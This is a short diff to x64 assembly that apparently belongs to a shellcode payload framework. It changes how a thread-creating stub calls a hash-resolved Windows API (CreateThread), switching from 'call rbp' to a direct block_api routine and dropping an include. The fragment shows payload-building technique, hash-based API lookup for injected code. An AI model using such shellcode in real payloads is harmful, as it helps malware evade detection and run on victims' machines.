@@ -16,7 +16,6 @@
   cld
   jmp start
 
-%include "./src/block/block_api.asm"
 
 start:
   xor ecx, ecx
@@ -31,10 +30,9 @@ start:
   pop rdx                                     ; lpThreadAttributes = NULL
 
   mov r10d, 0x160D6838                        ; hash( "kernel32.dll", "CreateThread" )
-  call rbp                                    ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
+  call block_api_direct                       ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
   add rsp, 40                                 ; RSP will be off by -40 after each call to block_api
   ret
 
 threadstart:
   add rsp, 0x20                               ; remove shadow stack
-
